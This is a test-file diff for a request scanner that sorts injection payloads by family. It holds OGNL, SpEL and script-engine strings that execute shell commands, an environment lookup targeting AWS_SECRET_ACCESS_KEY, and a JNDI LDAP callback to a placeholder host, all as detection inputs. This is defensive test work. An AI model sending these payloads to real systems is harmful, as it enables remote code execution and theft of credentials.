@@ -285,3 +285,63 @@ async def test_ordinary_request_stamps_nothing(flux_client):
     entry = _last(flux_client.log_path)
     assert "interpolationFamilies" not in entry
     assert "interpolationCallbacks" not in entry
+
+
+# --- Java-reflection payloads, in every brace style they arrive in -------
+#
+# Shapes below are the public grammars of Struts/OGNL, the Ivanti `format=`
+# sink and the `script:javascript:` evaluators. Hosts and identifiers are
+# placeholders; nothing here is copied from a live sender.
+
+@pytest.mark.parametrize("payload", [
+    # Struts `redirect:`/`action:` — dollar-braced, which is the spelling a
+    # `%{`-only pattern used to miss entirely.
+    "${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'sh','-c','id'})).start()}",
+    "${#context['xwork.MethodAccessor.denyMethodExecution']=false}",
+    "${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
+    "${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id')))}",
+    # Reflection by name, the shape that arrives in a `format=` parameter.
+    "${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')}",
+    # Script-engine evaluator.
+    "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+    # The other two brace styles, which were already covered.
+    "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",
+    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
+])
+def test_java_reflection_payloads_are_ognl_not_bare(payload):
+    out = scan(target="/x?q=" + payload)
+    assert "ognl" in out["interpolationFamilies"], out["interpolationFamilies"]
+    assert "bare-expression" not in out["interpolationFamilies"]
+
+
+def test_arithmetic_probe_stays_a_bare_expression():
+    """`${7*7}` is the canonical does-this-evaluate probe. It carries no
+    execution token, so it belongs in the low-confidence bucket rather
+    than being promoted alongside the reflection payloads."""
+    out = scan(target="/?search=${7*7}")
+    assert out["interpolationFamilies"] == ["bare-expression"]
+
+
+def test_percent_encoded_reflection_payload_is_decoded_then_matched():
+    """These arrive encoded in a query value, so the decode pass is what
+    makes the token list reachable at all."""
+    out = scan(target="/index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor%22%5D%7D")
+    assert "ognl" in out["interpolationFamilies"]
+
+
+def test_env_lookup_with_a_default_still_names_the_variable():
+    """`${env:NAME:-}` supplies a fallback. The variable asked for is the
+    same, and bulk env-harvesting payloads use this spelling."""
+    out = scan(headers={"User-Agent": "${env:AWS_SECRET_ACCESS_KEY:-}"})
+    assert "env:AWS_SECRET_ACCESS_KEY" in out["interpolationLookupKeys"]
+
+
+def test_filler_lookups_do_not_break_callback_extraction():
+    """Numeric `${:-NNN}` fillers pad a callback label for cache-busting.
+    They are not obfuscation — the literal is still in the clear — but
+    they must not swallow the collector domain."""
+    out = scan(headers={
+        "User-Agent": "${jndi:ldap://${:-711}${:-665}.probe.collector.example/a}"
+    })
+    assert "jndi" in out["interpolationFamilies"]
+    assert out["interpolationCallbacks"] == ["ldap://probe.collector.example"]
